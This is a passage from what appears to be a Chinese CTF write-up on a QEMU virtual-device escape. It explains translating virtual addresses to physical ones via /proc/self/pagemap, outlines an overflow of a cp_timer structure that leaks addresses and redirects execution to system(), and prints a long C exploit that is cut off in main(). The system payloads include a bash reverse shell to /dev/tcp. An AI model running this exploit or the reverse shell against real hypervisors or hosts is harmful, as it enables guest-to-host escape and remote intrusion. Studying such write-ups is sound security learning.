reading files in /proc.

There are four components to pagemap:

*/proc/pid/pagemap. This file lets a userspace process find out which
physical frame each virtual page is mapped to. It contains one 64-bit
value for each virtual page, containing the following data (from
fs/proc/task_mmu.c, above pagemap_read):

* Bits 0-54 page frame number (PFN) if present
* Bits 0-4 swap type if swapped
* Bits 5-54 swap offset if swapped
* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
* Bit 56 page exclusively mapped (since 4.2)
* Bits 57-60 zero
* Bit 61 page is file-page or shared-anon (since 3.5)
* Bit 62 page swapped
* Bit 63 page present

Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</code></pre>
<p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p>
<p>2、 读取长度为<code>64bits</code>的数据项</p>
<p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p>
<p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p>
<p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p>
<p>对应代码如下：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb13-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb13-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb13-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb13-4" title="4"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb13-5" title="5"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb13-6" title="6"><span class="pp">#include </span><span class="im">&lt;inttypes.h&gt;</span></a>
<a class="sourceLine" id="cb13-7" title="7"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb13-8" title="8"><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></a>
<a class="sourceLine" id="cb13-9" title="9"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb13-10" title="10"><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span><span class="pp">   </span></a>
<a class="sourceLine" id="cb13-11" title="11"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb13-12" title="12"></a>
<a class="sourceLine" id="cb13-13" title="13"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb13-14" title="14">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb13-15" title="15"></a>
<a class="sourceLine" id="cb13-16" title="16">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb13-17" title="17">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb13-18" title="18">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb13-19" title="19">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-20" title="20">    }</a>
<a class="sourceLine" id="cb13-21" title="21"></a>
<a class="sourceLine" id="cb13-22" title="22">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb13-23" title="23">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb13-24" title="24"></a>
<a class="sourceLine" id="cb13-25" title="25">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb13-26" title="26">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb13-27" title="27">        close(fd);</a>
<a class="sourceLine" id="cb13-28" title="28">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-29" title="29">    }</a>
<a class="sourceLine" id="cb13-30" title="30"></a>
<a class="sourceLine" id="cb13-31" title="31">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb13-32" title="32">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb13-33" title="33">        close(fd);</a>
<a class="sourceLine" id="cb13-34" title="34">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-35" title="35">    }</a>
<a class="sourceLine" id="cb13-36" title="36"></a>
<a class="sourceLine" id="cb13-37" title="37">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb13-38" title="38">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb13-39" title="39">        close(fd);</a>
<a class="sourceLine" id="cb13-40" title="40">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-41" title="41">    }</a>
<a class="sourceLine" id="cb13-42" title="42"></a>
<a class="sourceLine" id="cb13-43" title="43">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-44" title="44">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb13-45" title="45"></a>
<a class="sourceLine" id="cb13-46" title="46">    close(fd);</a>
<a class="sourceLine" id="cb13-47" title="47"></a>
<a class="sourceLine" id="cb13-48" title="48">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb13-49" title="49">}</a>
<a class="sourceLine" id="cb13-50" title="50"></a>
<a class="sourceLine" id="cb13-51" title="51"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb13-52" title="52">    <span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb13-53" title="53">    <span class="dt">uint64_t</span> userbuf_pa;</a>
<a class="sourceLine" id="cb13-54" title="54">    <span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb13-55" title="55"></a>
<a class="sourceLine" id="cb13-56" title="56">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</a>
<a class="sourceLine" id="cb13-57" title="57">    <span class="cf">if</span> (mmio_fd == -<span class="dv">1</span>){</a>
<a class="sourceLine" id="cb13-58" title="58">        perror(<span class="st">&quot;open mmio&quot;</span>);</a>
<a class="sourceLine" id="cb13-59" title="59">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-60" title="60">    }</a>
<a class="sourceLine" id="cb13-61" title="61"></a>
<a class="sourceLine" id="cb13-62" title="62">    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb13-63" title="63">    <span class="cf">if</span> (mmio_mem == MAP_FAILED){</a>
<a class="sourceLine" id="cb13-64" title="64">        perror(<span class="st">&quot;mmap mmio&quot;</span>);</a>
<a class="sourceLine" id="cb13-65" title="65">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-66" title="66">    }</a>
<a class="sourceLine" id="cb13-67" title="67"></a>
<a class="sourceLine" id="cb13-68" title="68">    printf(<span class="st">&quot;mmio_mem:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>, mmio_mem);</a>
<a class="sourceLine" id="cb13-69" title="69"></a>
<a class="sourceLine" id="cb13-70" title="70">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb13-71" title="71">    <span class="cf">if</span> (userbuf == MAP_FAILED){</a>
<a class="sourceLine" id="cb13-72" title="72">        perror(<span class="st">&quot;mmap userbuf&quot;</span>);</a>
<a class="sourceLine" id="cb13-73" title="73">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-74" title="74">    }</a>
<a class="sourceLine" id="cb13-75" title="75"></a>
<a class="sourceLine" id="cb13-76" title="76">    strcpy(userbuf,<span class="st">&quot;test&quot;</span>);</a>
<a class="sourceLine" id="cb13-77" title="77"></a>
<a class="sourceLine" id="cb13-78" title="78">    mlock(userbuf, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb13-79" title="79">    userbuf_pa = va2pa(userbuf);</a>
<a class="sourceLine" id="cb13-80" title="80"></a>
<a class="sourceLine" id="cb13-81" title="81">    printf(<span class="st">&quot;userbuf_va:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</a>
<a class="sourceLine" id="cb13-82" title="82">    printf(<span class="st">&quot;userbuf_pa:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,(<span class="dt">void</span> *)userbuf_pa);</a>
<a class="sourceLine" id="cb13-83" title="83">}</a></code></pre></div>
<h3 id="漏洞利用-1">3. 漏洞利用</h3>
<ul>
<li>通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。</li>
<li>通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流</li>
</ul>
<p>触发时钟可以利用两种方式：</p>
<ul>
<li>虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)</li>
<li>在 MMOI WRITE 中可以触发时钟</li>
</ul>
<p>system 执行内容：</p>
<ul>
<li>cat /flag</li>
<li>反弹 shell，/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。</li>
<li>弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。</li>
</ul>
<p>注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。</p>
<h3 id="exploit-1">4. Exploit</h3>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb14-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb14-2" title="2"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb14-3" title="3"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb14-4" title="4"><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb14-5" title="5"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb14-6" title="6"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb14-7" title="7"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb14-8" title="8"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb14-9" title="9"></a>
<a class="sourceLine" id="cb14-10" title="10"><span class="pp">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span></a>
<a class="sourceLine" id="cb14-11" title="11"><span class="pp">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span></a>
<a class="sourceLine" id="cb14-12" title="12"></a>
<a class="sourceLine" id="cb14-13" title="13"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb14-14" title="14"><span class="dt">uint64_t</span> phy_userbuf;</a>
<a class="sourceLine" id="cb14-15" title="15"><span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb14-16" title="16"><span class="dt">uint64_t</span> phy_userbuf1;</a>
<a class="sourceLine" id="cb14-17" title="17"><span class="dt">uint64_t</span> phy_buf0;</a>
<a class="sourceLine" id="cb14-18" title="18"><span class="dt">char</span> *userbuf1;</a>
<a class="sourceLine" id="cb14-19" title="19"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb14-20" title="20"><span class="dt">void</span> Err(<span class="dt">char</span>* err){</a>
<a class="sourceLine" id="cb14-21" title="21">    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>, err);</a>
<a class="sourceLine" id="cb14-22" title="22">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-23" title="23">}</a>
<a class="sourceLine" id="cb14-24" title="24"></a>
<a class="sourceLine" id="cb14-25" title="25"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb14-26" title="26">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</a>
<a class="sourceLine" id="cb14-27" title="27">    <span class="cf">if</span>(mmio_fd &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-28" title="28">        Err(<span class="st">&quot;Open pci&quot;</span>);</a>
<a class="sourceLine" id="cb14-29" title="29">    }</a>
<a class="sourceLine" id="cb14-30" title="30">    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-31" title="31">    <span class="cf">if</span>(mmio_mem&lt;<span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-32" title="32">        Err(<span class="st">&quot;mmap mmio_mem&quot;</span>);</a>
<a class="sourceLine" id="cb14-33" title="33">    }</a>
<a class="sourceLine" id="cb14-34" title="34">}</a>
<a class="sourceLine" id="cb14-35" title="35"></a>
<a class="sourceLine" id="cb14-36" title="36"><span class="dt">void</span> mmio_write(<span class="dt">uint64_t</span> addr, <span class="dt">uint64_t</span> value){</a>
<a class="sourceLine" id="cb14-37" title="37">    *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)) = value;</a>
<a class="sourceLine" id="cb14-38" title="38">}</a>
<a class="sourceLine" id="cb14-39" title="39"></a>
<a class="sourceLine" id="cb14-40" title="40"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb14-41" title="41">    <span class="cf">return</span> *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)); </a>
<a class="sourceLine" id="cb14-42" title="42">}</a>
<a class="sourceLine" id="cb14-43" title="43"></a>
<a class="sourceLine" id="cb14-44" title="44"><span class="dt">void</span> set_list_cnt(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-45" title="45">    mmio_write(<span class="bn">0x10</span>, cnt);</a>
<a class="sourceLine" id="cb14-46" title="46">}</a>
<a class="sourceLine" id="cb14-47" title="47"></a>
<a class="sourceLine" id="cb14-48" title="48"><span class="dt">void</span> set_src(<span class="dt">uint64_t</span> src){</a>
<a class="sourceLine" id="cb14-49" title="49">    mmio_write(<span class="bn">0x8</span>, src);</a>
<a class="sourceLine" id="cb14-50" title="50">}</a>
<a class="sourceLine" id="cb14-51" title="51"></a>
<a class="sourceLine" id="cb14-52" title="52"><span class="dt">void</span> set_cmd(<span class="dt">uint64_t</span> cmd){</a>
<a class="sourceLine" id="cb14-53" title="53">    mmio_write(<span class="bn">0x18</span>, cmd);</a>
<a class="sourceLine" id="cb14-54" title="54">}</a>
<a class="sourceLine" id="cb14-55" title="55"></a>
<a class="sourceLine" id="cb14-56" title="56"><span class="dt">void</span> set_read(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-57" title="57">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-58" title="58">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-59" title="59"></a>
<a class="sourceLine" id="cb14-60" title="60">    set_cmd(<span class="bn">0x4</span>);</a>
<a class="sourceLine" id="cb14-61" title="61">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-62" title="62">}</a>
<a class="sourceLine" id="cb14-63" title="63"></a>
<a class="sourceLine" id="cb14-64" title="64"><span class="dt">void</span> set_write(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-65" title="65">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-66" title="66">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-67" title="67"></a>
<a class="sourceLine" id="cb14-68" title="68">    set_cmd(<span class="bn">0x2</span>);</a>
<a class="sourceLine" id="cb14-69" title="69">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-70" title="70">}</a>
<a class="sourceLine" id="cb14-71" title="71"></a>
<a class="sourceLine" id="cb14-72" title="72"><span class="dt">void</span> set_read_write(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-73" title="73">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-74" title="74">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-75" title="75"></a>
<a class="sourceLine" id="cb14-76" title="76">    set_cmd(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-77" title="77">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-78" title="78">}</a>
<a class="sourceLine" id="cb14-79" title="79"></a>
<a class="sourceLine" id="cb14-80" title="80"><span class="pp">#define PAGE_SHIFT 12</span></a>
<a class="sourceLine" id="cb14-81" title="81"><span class="pp">#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></a>
<a class="sourceLine" id="cb14-82" title="82"><span class="pp">#define PFN_PRESENT (1ull &lt;&lt; 63)</span></a>
<a class="sourceLine" id="cb14-83" title="83"><span class="pp">#define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></a>
<a class="sourceLine" id="cb14-84" title="84"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb14-85" title="85"><span class="dt">uint32_t</span> page_offset(<span class="dt">uint32_t</span> addr)</a>
<a class="sourceLine" id="cb14-86" title="86">{</a>
<a class="sourceLine" id="cb14-87" title="87">    <span class="cf">return</span> addr &amp; ((<span class="dv">1</span> &lt;&lt; PAGE_SHIFT) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-88" title="88">}</a>
<a class="sourceLine" id="cb14-89" title="89"></a>
<a class="sourceLine" id="cb14-90" title="90"><span class="dt">uint64_t</span> gva_to_gfn(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb14-91" title="91">{</a>
<a class="sourceLine" id="cb14-92" title="92">    <span class="dt">uint64_t</span> pme, gfn;</a>
<a class="sourceLine" id="cb14-93" title="93">    <span class="dt">size_t</span> offset;</a>
<a class="sourceLine" id="cb14-94" title="94">    offset = ((<span class="dt">uintptr_t</span>)addr &gt;&gt; <span class="dv">9</span>) &amp; ~<span class="dv">7</span>;</a>
<a class="sourceLine" id="cb14-95" title="95">    <span class="co">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></a>
<a class="sourceLine" id="cb14-96" title="96">    lseek(fd, offset, SEEK_SET);</a>
<a class="sourceLine" id="cb14-97" title="97">    read(fd, &amp;pme, <span class="dv">8</span>);</a>
<a class="sourceLine" id="cb14-98" title="98">    <span class="cf">if</span> (!(pme &amp; PFN_PRESENT))</a>
<a class="sourceLine" id="cb14-99" title="99">        <span class="cf">return</span> -<span class="dv">1</span>;</a>
<a class="sourceLine" id="cb14-100" title="100">    gfn = pme &amp; PFN_PFN;</a>
<a class="sourceLine" id="cb14-101" title="101">    <span class="cf">return</span> gfn;</a>
<a class="sourceLine" id="cb14-102" title="102">}</a>
<a class="sourceLine" id="cb14-103" title="103"></a>
<a class="sourceLine" id="cb14-104" title="104"><span class="co">/*</span></a>
<a class="sourceLine" id="cb14-105" title="105"><span class="co">* transfer visual address to physic address</span></a>
<a class="sourceLine" id="cb14-106" title="106"><span class="co">*/</span></a>
<a class="sourceLine" id="cb14-107" title="107"><span class="dt">uint64_t</span> gva_to_gpa(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb14-108" title="108">{</a>
<a class="sourceLine" id="cb14-109" title="109">    <span class="dt">uint64_t</span> gfn = gva_to_gfn(addr);</a>
<a class="sourceLine" id="cb14-110" title="110">    <span class="cf">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="dt">uint64_t</span>)addr);</a>
<a class="sourceLine" id="cb14-111" title="111">}</a>
<a class="sourceLine" id="cb14-112" title="112"></a>
<a class="sourceLine" id="cb14-113" title="113"></a>
<a class="sourceLine" id="cb14-114" title="114"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb14-115" title="115">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb14-116" title="116"></a>
<a class="sourceLine" id="cb14-117" title="117">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb14-118" title="118">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb14-119" title="119"></a>
<a class="sourceLine" id="cb14-120" title="120">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-121" title="121">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb14-122" title="122">        close(fd);</a>
<a class="sourceLine" id="cb14-123" title="123">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-124" title="124">    }</a>
<a class="sourceLine" id="cb14-125" title="125"></a>
<a class="sourceLine" id="cb14-126" title="126">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb14-127" title="127">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb14-128" title="128">        close(fd);</a>
<a class="sourceLine" id="cb14-129" title="129">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-130" title="130">    }</a>
<a class="sourceLine" id="cb14-131" title="131"></a>
<a class="sourceLine" id="cb14-132" title="132">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb14-133" title="133">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb14-134" title="134">        close(fd);</a>
<a class="sourceLine" id="cb14-135" title="135">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-136" title="136">    }</a>
<a class="sourceLine" id="cb14-137" title="137"></a>
<a class="sourceLine" id="cb14-138" title="138">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-139" title="139">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb14-140" title="140"></a>
<a class="sourceLine" id="cb14-141" title="141">    close(fd);</a>
<a class="sourceLine" id="cb14-142" title="142"></a>
<a class="sourceLine" id="cb14-143" title="143">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb14-144" title="144">}</a>
<a class="sourceLine" id="cb14-145" title="145"></a>
<a class="sourceLine" id="cb14-146" title="146"><span class="dt">void</span> print_hex(<span class="dt">uint64_t</span> len, <span class="dt">uint64_t</span> offset){</a>
<a class="sourceLine" id="cb14-147" title="147">    printf(<span class="st">&quot;===========================</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-148" title="148">    <span class="cf">for</span>(<span class="dt">int</span> i = <span class="dv">0</span>; i&lt;len/<span class="dv">8</span>; i++){</a>
<a class="sourceLine" id="cb14-149" title="149">        printf(<span class="st">&quot;    0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, *(<span class="dt">uint64_t</span>*)(userbuf1+offset+i*<span class="dv">8</span>));</a>
<a class="sourceLine" id="cb14-150" title="150">    }</a>
<a class="sourceLine" id="cb14-151" title="151">}</a>
<a class="sourceLine" id="cb14-152" title="152"></a>
<a class="sourceLine" id="cb14-153" title="153"><span class="dt">size_t</span> buf0, buf1;</a>
<a class="sourceLine" id="cb14-154" title="154"></a>
<a class="sourceLine" id="cb14-155" title="155"><span class="dt">void</span> get_pages()</a>
<a class="sourceLine" id="cb14-156" title="156">{</a>
<a class="sourceLine" id="cb14-157" title="157">    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb14-158" title="158">    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb14-159" title="159">    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-160" title="160">    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb14-161" title="161">    <span class="dt">int</span> n = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-162" title="162">    buf[n] = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb14-163" title="163">    arry[n++] = arr;</a>
<a class="sourceLine" id="cb14-164" title="164">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</a>
<a class="sourceLine" id="cb14-165" title="165">    {</a>
<a class="sourceLine" id="cb14-166" title="166">        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-167" title="167">        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb14-168" title="168">        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb14-169" title="169">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</a>
<a class="sourceLine" id="cb14-170" title="170">        {</a>
<a class="sourceLine" id="cb14-171" title="171">            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</a>
<a class="sourceLine" id="cb14-172" title="172">            {</a>
<a class="sourceLine" id="cb14-173" title="173">                LOG(<span class="st">&quot;consist pages&quot;</span>);</a>
<a class="sourceLine" id="cb14-174" title="174">                HEX(arr);</a>
<a class="sourceLine" id="cb14-175" title="175">                HEX(fn);</a>
<a class="sourceLine" id="cb14-176" title="176">                HEX(arry[j]);</a>
<a class="sourceLine" id="cb14-177" title="177">                HEX(buf[j]);</a>
<a class="sourceLine" id="cb14-178" title="178">                <span class="cf">if</span> (fn &gt; buf[j])</a>
<a class="sourceLine" id="cb14-179" title="179">                {</a>
<a class="sourceLine" id="cb14-180" title="180">                    buf0 = arry[j];</a>
<a class="sourceLine" id="cb14-181" title="181">                    buf1 = arr;</a>
<a class="sourceLine" id="cb14-182" title="182">                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb14-183" title="183">                }</a>
<a class="sourceLine" id="cb14-184" title="184">                <span class="cf">else</span></a>
<a class="sourceLine" id="cb14-185" title="185">                {</a>
<a class="sourceLine" id="cb14-186" title="186">                    buf1 = arry[j];</a>
<a class="sourceLine" id="cb14-187" title="187">                    buf0 = arr;</a>
<a class="sourceLine" id="cb14-188" title="188">                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb14-189" title="189">                }</a>
<a class="sourceLine" id="cb14-190" title="190">                <span class="cf">return</span>;</a>
<a class="sourceLine" id="cb14-191" title="191">            }</a>
<a class="sourceLine" id="cb14-192" title="192">        }</a>
<a class="sourceLine" id="cb14-193" title="193">        buf[n] = fn;</a>
<a class="sourceLine" id="cb14-194" title="194">        arry[n++] = arr;</a>
<a class="sourceLine" id="cb14-195" title="195">    }</a>
<a class="sourceLine" id="cb14-196" title="196">}</a>
<a class="sourceLine" id="cb14-197" title="197"></a>
<a class="sourceLine" id="cb14-198" title="198"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb14-199" title="199"></a>
